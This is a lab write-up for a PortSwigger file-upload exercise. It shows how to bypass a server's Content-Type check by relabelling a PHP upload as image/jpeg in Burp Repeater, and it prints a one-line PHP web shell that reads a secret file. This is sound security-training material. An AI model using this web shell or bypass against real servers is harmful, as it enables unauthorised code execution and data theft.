---
type: lab
platform: PortSwigger
topic: File Upload
difficulty: Apprentice
status: solved
date: 2026-10-28
tags: [portswigger, file-upload, rce]
---

# Web shell upload via Content-Type restriction bypass

## 🎯 Goal
Upload a PHP web shell by bypassing a Content-Type check, then use it to exfiltrate `/home/carlos/secret`.

## 🧠 Core idea
The server validates the file type by trusting the `Content-Type` header sent in the upload request — a value the client controls and can set to anything. So the "validation" isn't checking the actual file content at all, just a label the browser attaches, which means lying about the Content-Type is enough to bypass it entirely.

## 🔍 Recon
- Logged in and uploaded a real image first, confirmed it's served at a predictable path: `/files/avatars/<filename>`.
- Tried uploading `exploit.php` directly — server rejected it, response said only `image/jpeg` or `image/png` MIME types are allowed. This told me the check is MIME-type based, not content-based.

## 💥 Exploitation (step by step)
1. Created `exploit.php` locally:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. Attempted the upload — got rejected due to Content-Type restriction, confirming the filter only checks that header.
3. Found the `POST /my-account/avatar` request in Burp's proxy history and sent it to Repeater.
4. In the request body, found the part describing the uploaded file and changed its `Content-Type` field from `application/x-php` (or similar) to `image/jpeg`, while keeping the PHP file content and `.php` filename unchanged.
5. Sent the request — response confirmed successful upload.
6. In a separate Repeater tab, sent `GET /files/avatars/exploit.php`.
7. Server executed the PHP file — response contained Carlos's secret.
8. Submitted the secret via the lab banner.

## 🧾 Payload used
```
Content-Type: image/jpeg   <- set in the multipart file part, filename still exploit.php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```